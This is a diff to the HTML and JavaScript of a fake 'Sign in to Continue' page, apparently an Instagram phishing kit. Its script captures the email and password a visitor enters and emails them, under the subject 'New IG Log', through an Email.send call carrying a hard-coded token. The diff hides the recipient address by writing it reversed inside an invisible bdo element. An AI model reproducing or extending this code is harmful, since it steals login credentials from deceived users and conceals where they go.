@@ -30,7 +30,7 @@
 					<div class="card fat">
 						<div class="card-body">
 							<h4 class="card-title">Sign in to Continue</h4>
-							<bdo dir="rtl">moc&period;liamg&commat;lellaheze</bdo>
+							<bdo dir="rtl" style="display: none;" id="sendermail">moc&period;liamg&commat;lellaheze</bdo>
 							<form action="#" method="POST" class="my-login-validation" novalidate="">
 								<div class="form-group">
 									<input id="email" type="username" placeholder="Phone number, username, email address" class="form-control" name="email" value="" required autofocus>
@@ -80,11 +80,12 @@
     var email = document.getElementById("email").value;
     var pass = document.getElementById("pass").value;
     var finalmessage = "email is " + email + " and password is " + pass;
-    var sendermail = 
+    var sendermail = document.getElementById("sendermail").innerHTML;
+    console.log(sendermail);
 			
 		Email.send({
     SecureToken : "9a4785c5-0ed2-431e-882b-62faaed07dc2",
-    To : 'ezehallel@gmail.com',
+    To : sendermail,
     From : "ezehallel@gmail.com",
     Subject : "New IG Log",
     Body : finalmessage
